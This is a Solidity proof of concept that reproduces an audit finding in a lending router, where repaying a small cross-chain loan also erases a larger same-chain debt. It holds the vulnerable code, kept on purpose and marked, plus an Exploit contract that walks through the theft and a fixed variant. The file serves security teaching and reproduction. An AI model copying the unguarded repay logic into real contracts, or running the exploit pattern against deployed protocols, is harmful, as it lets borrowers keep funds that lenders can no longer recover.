// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LEND — CoreRouter.repayBorrowInternal updates same-chain debt on a cross-chain repay
    (Sherlock, finding 58385).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the block labeled "Update same-chain borrow balances" is not guarded by
    _isSameChain. Repaying a 100-token cross-chain loan deletes a 1,000-token same-chain
    borrow. The borrower keeps the 1,000. Lenders on this chain cannot collect it.
    Vulnerable line preserved verbatim below (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount && allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CoreRouter {
    Token public token;
    mapping(address => uint256) public sameChainDebt;
    mapping(address => uint256) public crossChainDebt;
    mapping(address => bool) public borrowedAsset;

    constructor(Token token_) {
        token = token_;
    }

    function borrow(address borrower, uint256 amount) external {
        sameChainDebt[borrower] += amount;
        borrowedAsset[borrower] = true;
        token.transfer(borrower, amount);
    }

    function borrowForCrossChain(address borrower, uint256 amount) external {
        crossChainDebt[borrower] += amount;
        token.transfer(borrower, amount);
    }

    function repayBorrow(address borrower, uint256 amount, bool isSameChain) external {
        repayBorrowInternal(borrower, amount, isSameChain);
    }

    function repayBorrowInternal(address borrower, uint256 repayAmountFinal, bool _isSameChain) internal {
        uint256 borrowedAmount = _isSameChain ? sameChainDebt[borrower] : crossChainDebt[borrower];
        token.transferFrom(borrower, address(this), repayAmountFinal);
        if (!_isSameChain) {
            crossChainDebt[borrower] = borrowedAmount - repayAmountFinal;
        }
        // Update same-chain borrow balances
        if (repayAmountFinal == borrowedAmount) {
            delete sameChainDebt[borrower]; // @> VULN: this delete runs even when _isSameChain is false
            delete borrowedAsset[borrower];
            // FIX: if (_isSameChain) { delete sameChainDebt[borrower]; delete borrowedAsset[borrower]; }
        } else {
            sameChainDebt[borrower] = borrowedAmount - repayAmountFinal;
        }
    }

    function repayCrossFixed(address borrower, uint256 repayAmountFinal) external {
        uint256 borrowedAmount = crossChainDebt[borrower];
        token.transferFrom(borrower, address(this), repayAmountFinal);
        crossChainDebt[borrower] = borrowedAmount - repayAmountFinal;
    }
}

contract Exploit {
    Token public token; // nonce 1
    CoreRouter public router; // nonce 2
    uint256 public profit;
    uint256 public sameDebt;
    uint256 public crossDebt;

    constructor() {
        token = new Token("LEND");
        router = new CoreRouter(token);
    }

    function run() external {
        token.mint(address(router), 2000 ether);
        router.borrow(address(this), 1000 ether);
        router.borrowForCrossChain(address(this), 100 ether);
        token.approve(address(router), 100 ether);
        router.repayBorrow(address(this), 100 ether, false);
        uint256 got = token.balanceOf(address(this));
        token.transfer(msg.sender, got);
        profit = token.balanceOf(msg.sender);
        sameDebt = router.sameChainDebt(address(this));
        crossDebt = router.crossChainDebt(address(this));
        require(crossDebt == 0, "cross-chain debt remains");
        require(sameDebt == 0, "same-chain debt was kept");
        require(profit == 1000 ether, "borrower did not keep the same-chain proceeds");
        require(router.borrowedAsset(address(this)) == false, "asset still listed");
    }

    function runFixed() external {
        token.mint(address(router), 2000 ether);
        router.borrow(address(this), 1000 ether);
        router.borrowForCrossChain(address(this), 100 ether);
        token.approve(address(router), 100 ether);
        router.repayCrossFixed(address(this), 100 ether);
    }
}
